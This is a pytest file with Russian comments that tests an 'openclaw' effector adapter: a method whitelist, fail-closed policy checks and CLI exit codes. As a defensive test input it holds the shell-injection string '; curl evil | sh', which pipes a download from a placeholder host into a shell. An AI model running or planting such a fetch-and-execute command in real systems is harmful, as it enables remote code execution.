# SPDX-FileCopyrightText: 2026 COMMONS contributors
# SPDX-License-Identifier: Apache-2.0
"""Приёмки SPEC-0008: эффектор openclaw — руки организма за стволом мозга.

Мост — CLI, не самодельный протокол (G2, ADR-0010): организм зовёт
'openclaw gateway call <method> --json' на инъектируемом runner'е; тесты
идут без сети и без собранных shell-строк. Fail-closed (G1): метод вне
белого списка и параметры не dict — отказ ещё до запуска runner'а;
binary-missing / call-failed / parse — каждый отказной режим §4 закреплён
фикстурой. Политика эффекта — данные (G2): живой
openclaw/reference/effector-policy.json зелёный ('POLICY: 1 ok, 0 failed'),
нарушения (bind-open, auth-weak, method-unknown, exec-open) — красные.
Каждый вердикт объясним (G3): rule + причина по-русски. Инъекция в тексте
сообщения остаётся значением JSON — shell не строится.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

from openclaw import ALLOWED_METHODS
from openclaw.adapter import EffectorResult, OpenClawAdapter, default_runner, main
from openclaw.check import CheckResult, run_check, validate_policy

REPO_ROOT = Path(__file__).resolve().parents[1]
# Живая политика эффекта — данные (SPEC-0008 §2 п.5), путь от корня репо.
LIVE_POLICY = "openclaw/reference/effector-policy.json"
MANIFEST_PATH = REPO_ROOT / "synapse" / "mcp-manifest.yaml"

# Инъекция из приёмки SPEC-0008 §5: обязана остаться ЗНАЧЕНИЕМ 'message'.
INJECTION = "; curl evil | sh"


# --- Оснастка: подставной runner и слепки политики для tmp-фикстур ---


class FakeRunner:
    """Runner-подставка: argv -> (rc, stdout, stderr); все вызовы запоминаются."""

    def __init__(self, rc: int = 0, stdout: str = "{}", stderr: str = "") -> None:
        self.rc, self.stdout, self.stderr = rc, stdout, stderr
        self.calls: list[list[str]] = []

    def __call__(self, argv: list[str]) -> tuple[int, str, str]:
        self.calls.append(list(argv))
        return self.rc, self.stdout, self.stderr


def _missing_runner(argv: list[str]) -> tuple[int, str, str]:
    """Runner хоста без бинарника: subprocess естественным образом бросает FileNotFoundError."""
    raise FileNotFoundError(2, "No such file or directory", "openclaw")


def _policy_doc(**overrides: object) -> dict:
    """Валидный слепок политики: все REQUIRED_POLICY-поля зелёные;
    переопределения дают негативные фикстуры (нарушение ровно одного правила)."""
    doc: dict = {
        "gateway_url": "${OPENCLAW_GATEWAY_URL}",
        "bind": "loopback",
        "auth_token_env": "OPENCLAW_GATEWAY_TOKEN",
        "allowed_methods": list(ALLOWED_METHODS),
        "exec_approval_required": True,
    }
    doc.update(overrides)
    return doc


def _write_policy(tmp_path: Path, doc: object, name: str = "policy.json") -> Path:
    """Слепок политики на диск; строка пишется как есть (фикстура 'parse')."""
    path = tmp_path / name
    if isinstance(doc, str):
        path.write_text(doc, encoding="utf-8")
    else:
        path.write_text(json.dumps(doc, ensure_ascii=False), encoding="utf-8")
    return path


def _params_value(argv: list[str]) -> str:
    """Значение после '--params' в argv моста (JSON-слепок параметров вызова)."""
    assert "--params" in argv, f"в argv нет '--params': {argv!r}"
    return argv[argv.index("--params") + 1]


# --- Живая политика зелёная (SPEC-0008 §Приёмка) ---


def test_live_policy_ok(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    """Живая политика проходит валидатор целиком: rule 'ok'; гейт печатает
    'POLICY: 1 ok, 0 failed' и возвращает 0 (G2/G3)."""
    monkeypatch.chdir(REPO_ROOT)
    result = validate_policy(LIVE_POLICY)
    assert isinstance(result, CheckResult)
    assert result.ok
    assert result.rule == "ok"
    assert result.reason, "пустая причина у живой политики (G3)"
    assert run_check(LIVE_POLICY) == 0
    assert "POLICY: 1 ok, 0 failed" in capsys.readouterr().out


def test_policy_methods_whitelisted() -> None:
    """Честность данных (ADR-0009/G2): белый список — кортеж ровно четырёх
    закреплённых методов (SPEC-0008 §2 п.3); каждый метод живой политики
    входит в него — политика не обещает телу лишнего."""
    assert isinstance(ALLOWED_METHODS, tuple)
    assert ALLOWED_METHODS == ("health", "status", "chat.send", "chat.abort")
    doc = json.loads((REPO_ROOT / LIVE_POLICY).read_text(encoding="utf-8"))
    methods = doc["allowed_methods"]
    assert isinstance(methods, list) and methods, "в живой политике нет непустого allowed_methods"
    for method in methods:
        assert method in ALLOWED_METHODS, f"метод живой политики вне белого списка: {method!r}"


# --- G1 fail-closed: политика-данные не принимает нарушения молча ---


def test_missing_policy(monkeypatch: pytest.MonkeyPatch) -> None:
    """Отсутствующий файл политики — отказ rule='missing' (fail-closed)."""
    monkeypatch.chdir(REPO_ROOT)
    result = validate_policy("openclaw/reference/нет-такого.json")
    assert not result.ok
    assert result.rule == "missing"


def test_parse_policy(tmp_path: Path) -> None:
    """Битый JSON в политике — отказ rule='parse' (молчаливых пропусков нет, G1)."""
    result = validate_policy(_write_policy(tmp_path, "{ это не json", name="broken.json"))
    assert not result.ok
    assert result.rule == "parse"


def test_structure_policy(tmp_path: Path) -> None:
    """Неполная структура: JSON-массив и dict без поля 'bind' из REQUIRED_POLICY —
    оба отказа rule='structure' (порядок: missing -> parse -> structure)."""
    result = validate_policy(_write_policy(tmp_path, ["gateway_url", "bind"], name="array.json"))
    assert not result.ok
    assert result.rule == "structure"

    doc = _policy_doc()
    del doc["bind"]
    result = validate_policy(_write_policy(tmp_path, doc, name="no-bind.json"))
    assert not result.ok
    assert result.rule == "structure"


def test_bind_open_rejected(tmp_path: Path) -> None:
    """bind не loopback ('0.0.0.0') — rule='bind-open'; причина отсылает к
    CVE-2026-25253 или к loopback (уроки SPEC-0008 §1)."""
    result = validate_policy(_write_policy(tmp_path, _policy_doc(bind="0.0.0.0")))
    assert not result.ok
    assert result.rule == "bind-open"
    assert "CVE-2026-25253" in result.reason or "loopback" in result.reason, result.reason


def test_auth_weak_rejected(tmp_path: Path) -> None:
    """G1: токен-данные ('sk-ant-токен-в-данных') и lowercase-имя ('openclaw_token')
    — оба rule='auth-weak': в данных только ИМЯ env-переменной ^[A-Z_][A-Z0-9_]*$."""
    leak = validate_policy(_write_policy(tmp_path, _policy_doc(auth_token_env="sk-ant-токен-в-данных")))
    assert not leak.ok
    assert leak.rule == "auth-weak"
    lower = validate_policy(
        _write_policy(tmp_path, _policy_doc(auth_token_env="openclaw_token"), name="lower.json")
    )
    assert not lower.ok
    assert lower.rule == "auth-weak"


def test_unknown_method_in_policy(tmp_path: Path) -> None:
    """Метод вне белого списка в политике ('chat.history') — rule='method-unknown'."""
    result = validate_policy(_write_policy(tmp_path, _policy_doc(allowed_methods=["chat.history"])))
    assert not result.ok
    assert result.rule == "method-unknown"


def test_exec_open_rejected(tmp_path: Path) -> None:
    """exec_approval_required не True — rule='exec-open': exec только под approvals человека."""
    result = validate_policy(_write_policy(tmp_path, _policy_doc(exec_approval_required=False)))
    assert not result.ok
    assert result.rule == "exec-open"


# --- G1 fail-closed: мост не запускает бинарник зря ---


def test_method_not_allowed_no_run() -> None:
    """G1: метод вне белого списка — отказ rule='method-not-allowed' ещё ДО запуска
    runner'а (runner.calls пуст, SPEC-0008 §4)."""
    runner = FakeRunner()
    adapter = OpenClawAdapter(runner=runner)
    result = adapter.call("chat.history")
    assert isinstance(result, EffectorResult)
    assert not result.ok
    assert result.rule == "method-not-allowed"
    assert "белого списка" in result.reason
    assert runner.calls == []


def test_params_type_rejected_no_run() -> None:
    """G1: params не dict ('curl evil | sh') — rule='params-type', runner не запускается."""
    runner = FakeRunner()
    adapter = OpenClawAdapter(runner=runner)
    result = adapter.call("status", params="curl evil | sh")
    assert not result.ok
    assert result.rule == "params-type"
    assert runner.calls == []


# --- Мост CLI: форма вызова и закрытый объект chat.send (G2) ---


def test_health_call_shape() -> None:
    """Мост строит argv ровно ['openclaw', 'gateway', 'call', 'health', '--json']
    (без --params); stdout парсится в payload (ADR-0010, G2)."""
    runner = FakeRunner(stdout='{"ok": true}')
    adapter = OpenClawAdapter(runner=runner)
    result = adapter.health()
    assert isinstance(result, EffectorResult)
    assert result.ok
    assert result.rule == "ok"
    assert result.method == "health"
    assert result.payload == {"ok": True}
    assert runner.calls == [["openclaw", "gateway", "call", "health", "--json"]]


def test_send_message_closed_params() -> None:
    """chat.send — закрытый объект (SPEC-0008 §2 п.4): sessionKey + message +
    idempotencyKey, ровно три ключа; ключ идемпотентности генерирует тело (uuid4)
    на каждый импульс — повтор не дублирует сообщение человеку."""
    runner = FakeRunner()
    adapter = OpenClawAdapter(runner=runner)
    result = adapter.send_message("привет", session_key="agent:main")
    assert result.ok
    assert result.method == "chat.send"
    params = json.loads(_params_value(runner.calls[0]))
    assert set(params) == {"sessionKey", "message", "idempotencyKey"}
    assert params["sessionKey"] == "agent:main"
    assert params["message"] == "привет"
    assert isinstance(params["idempotencyKey"], str) and params["idempotencyKey"]

    first_key = params["idempotencyKey"]
    adapter.send_message("привет", session_key="agent:main")
    second = json.loads(_params_value(runner.calls[1]))
    assert second["idempotencyKey"] != first_key, "ключ идемпотентности обязан меняться (uuid4)"


def test_send_message_env_session(monkeypatch: pytest.MonkeyPatch) -> None:
    """G2: смена сессии — env, не код: COMMONS_OPENCLAW_SESSION задаёт sessionKey,
    когда вызов не передал session_key явно."""
    monkeypatch.setenv("COMMONS_OPENCLAW_SESSION", "team")
    runner = FakeRunner()
    adapter = OpenClawAdapter(runner=runner)
    adapter.send_message("x")
    params = json.loads(_params_value(runner.calls[0]))
    assert params["sessionKey"] == "team"
    assert params["message"] == "x"


def test_injection_stays_data() -> None:
    """SPEC-0008 §5: инъекция ('; curl evil | sh') остаётся ЗНАЧЕНИЕМ 'message'
    в JSON-аргументе --params; за пределами параметра текст инъекции не встречается,
    shell-строка не строится, вызов уходит мосту в форме 'gateway call chat.send'."""
    runner = FakeRunner()
    adapter = OpenClawAdapter(runner=runner)
    result = adapter.send_message(INJECTION)
    assert result.ok
    assert result.method == "chat.send"
    argv = runner.calls[0]
    assert isinstance(argv, list)
    assert argv[:4] == ["openclaw", "gateway", "call", "chat.send"]
    params_value = _params_value(argv)
    params = json.loads(params_value)
    assert params["message"] == INJECTION
    for index, element in enumerate(argv):
        if index == argv.index("--params") + 1:
            continue
        assert "curl" not in element, f"текст инъекции утёк за пределы --params: {element!r}"


# --- Отказные режимы runner'а (SPEC-0008 §4) ---


def test_binary_missing() -> None:
    """Бинарника нет на хосте — rule='binary-missing'; причина напоминает:
    живой gateway разворачивает человек (PID 1), в теле его нет (§2 п.1/п.7)."""
    adapter = OpenClawAdapter(runner=_missing_runner)
    result = adapter.call("health")
    assert not result.ok
    assert result.rule == "binary-missing"
    assert "PID 1" in result.reason or "человека" in result.reason, result.reason


def test_call_failed_rc() -> None:
    """Gateway вернул rc != 0 — rule='call-failed'; причина несёт код выхода (G3)."""
    adapter = OpenClawAdapter(runner=FakeRunner(rc=3, stderr="boom"))
    result = adapter.call("status")
    assert not result.ok
    assert result.rule == "call-failed"
    assert "3" in result.reason, result.reason


def test_parse_failed() -> None:
    """stdout не JSON — rule='parse'; каждый отказ объясним (rule + причина, G3)."""
    adapter = OpenClawAdapter(runner=FakeRunner(stdout="не-json"))
    result = adapter.call("status")
    assert not result.ok
    assert result.rule == "parse"
    assert result.reason


# --- CLI-гейт: коды возврата для CI (G3) ---


def test_cli_exit_codes(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    """CLI (G3): health на зелёном runner'е -> 0 и 'OPENCLAW: ok health';
    send без --text -> 1 и 'OPENCLAW: FAIL (params-type)';
    rc=2 у runner'а -> 1 и 'OPENCLAW: FAIL (call-failed)'."""
    assert callable(default_runner)
    monkeypatch.setattr("openclaw.adapter.default_runner", FakeRunner(stdout="{}"))
    assert main(["health"]) == 0
    assert "OPENCLAW: ok health" in capsys.readouterr().out

    assert main(["send"]) == 1
    assert "OPENCLAW: FAIL (params-type)" in capsys.readouterr().out

    monkeypatch.setattr("openclaw.adapter.default_runner", FakeRunner(rc=2, stderr="boom"))
    assert main(["health"]) == 1
    assert "OPENCLAW: FAIL (call-failed)" in capsys.readouterr().out


# --- Манифест синапсов: орган openclaw (SPEC-0008 §5) ---


def test_manifest_effector_entry() -> None:
    """Запись органа openclaw в synapse/mcp-manifest.yaml: эффектор в режиме
    dependency, tools отображаются в белый список 1:1, секрет — только имя
    env-переменной (не значение), адаптер — openclaw.adapter:OpenClawAdapter."""
    doc = yaml.safe_load(MANIFEST_PATH.read_text(encoding="utf-8"))
    entry = None
    for organ in doc.get("organs") or []:
        if organ.get("name") == "openclaw":
            entry = organ
            break
    assert entry is not None, (
        "в synapse/mcp-manifest.yaml нет записи name: openclaw "
        "(ожидаемо красно до интеграции органа в синапсы)"
    )
    assert entry["system"] == "effectors"
    assert entry["mode"] == "dependency"
    assert entry["license"] == "MIT"
    assert entry["transport"] == "http"
    assert entry["healthcheck"] == "GET /healthz"
    assert "${OPENCLAW_GATEWAY_URL}" in str(entry["endpoint"]), "секрет не в теле: только имя переменной"
    assert list(entry["tools"]) == ["health", "status", "send_message", "abort"]
    mapping = {"health": "health", "status": "status", "send_message": "chat.send", "abort": "chat.abort"}
    assert set(mapping) == set(entry["tools"]), "tools -> методы должны отображаться 1:1"
    for tool, method in mapping.items():
        assert method in ALLOWED_METHODS, f"инструмент {tool!r} ведёт к методу вне белого списка: {method!r}"
    authority = entry["authority"]
    assert authority["network"] == "localhost-only"
    assert authority["fs"] == "none"
    assert entry["adapter"] == "openclaw.adapter:OpenClawAdapter"
